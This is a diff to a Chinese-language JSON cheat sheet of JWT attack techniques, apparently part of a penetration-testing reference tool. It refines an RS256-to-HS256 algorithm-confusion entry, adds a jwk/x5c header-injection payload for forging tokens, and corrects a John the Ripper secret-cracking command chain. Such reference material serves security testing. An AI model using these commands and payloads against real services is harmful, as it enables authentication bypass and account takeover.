@@ -31,7 +31,7 @@
       "title": "RS256 转 HS256 混淆",
       "category": "算法混淆",
       "code": "使用公钥作为 HMAC 密钥重新签名：python3 jwt_tool.py <token> -X k -pk public.pem",
-      "desc": "当服务端不校验 alg 时，可用公开的 RSA 公钥作为 HS256 密钥伪造签名。",
+      "desc": "服务端按 header 的 alg 选择校验算法、且 HS256 与 RS256 共用同一密钥材料时，可把 alg 改成 HS256 并用公开的 RSA 公钥作为 HMAC 密钥重新签名。",
       "tags": ["jwt", "algorithm-confusion", "rs256"],
       "vars": [],
       "risk": "attack",
@@ -71,6 +71,17 @@
       "source": "OWASP JWT Cheat Sheet"
     },
     {
+      "id": "jwt-jwk-header",
+      "title": "jwk / x5c 头部注入",
+      "category": "头部注入",
+      "code": "{\"alg\":\"RS256\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"<自有公钥模数>\",\"e\":\"AQAB\",\"kid\":\"self-key\"}}",
+      "desc": "服务端若直接信任 header 里的 jwk 并用它验签，可用自己的私钥签名伪造 token；x5c 链同理，注意部分实现只按 kid 取密钥。",
+      "tags": ["jwt", "jwk", "x5c", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP JWT Cheat Sheet"
+    },
+    {
       "id": "jwt-weak-secret-crack",
       "title": "弱密钥爆破",
       "category": "密钥爆破",
@@ -85,8 +96,8 @@
       "id": "jwt-johntheripper",
       "title": "John 爆破 JWT",
       "category": "密钥爆破",
-      "code": "john --format=HMAC-SHA256 jwt.txt",
-      "desc": "另一种离线爆破方式，可与 hashcat 互为备份。",
+      "code": "python3 jwt2john.py <token> > jwt.hash\njohn --format=HMAC-SHA256 jwt.hash",
+      "desc": "John 不能直接读取原始 JWT，需先用 jwt2john 转成哈希格式再跑字典，可与 hashcat 互为备份。",
       "tags": ["jwt", "bruteforce", "john"],
       "vars": [],
       "risk": "attack",
